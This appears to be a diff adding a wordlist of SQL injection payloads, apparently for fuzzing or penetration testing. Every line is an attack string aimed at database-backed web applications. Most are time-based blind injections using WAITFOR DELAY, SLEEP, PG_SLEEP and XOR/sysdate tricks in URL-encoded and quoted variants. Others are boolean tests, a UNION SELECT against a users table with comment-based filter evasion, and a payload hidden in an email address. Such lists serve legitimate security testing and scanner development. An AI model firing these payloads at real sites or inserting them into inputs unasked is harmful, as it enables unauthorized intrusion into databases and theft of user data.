@@ -1,0 +1,29 @@
+'%3bWAITFOR+DELAY+'00%3a00%3a5'--
+'%2b(select*from(select(sleep(2)))a)%2b
+'union%23%0aselect 1,2,3,4/*!44444from*/users%23
+,%27%29%20AND%20%28SELECT%209683%20FROM%20%28SELECT%28SLEEP%285%29%29%29FKuq%29--%20wXyW
+'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z
+'XOR(if(now()=sysdate(),sleep(3),0))OR'
+OR 3*3*1=9 AND 000123=000123 --
+OR 3*3*1=4 AND 000123=000123 --
+';SELECT IF((8303>8302),SLEEP(9),2356)#
+"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
+1 waitfor delay '0:0:5' --
+';%20waitfor%20delay%20'0:0:6'%20--%20
+'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
+%20waitfor%20delay%20'0:0:15'%20--%20
+'xor(if(now()=sysdate(),sleep(30),0))or
+1;SELECT IF((8303>8302),SLEEP(13),2356)#
+'%2b(select*from(select(sleep(20)))a)%2b'
+';WAITFOR DELAY '0:0:5'-- 
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+test@att.net'%2b(select*from(select(sleep(2)))a)%2b'
+'+(selectfrom(select(sleep(66)))a
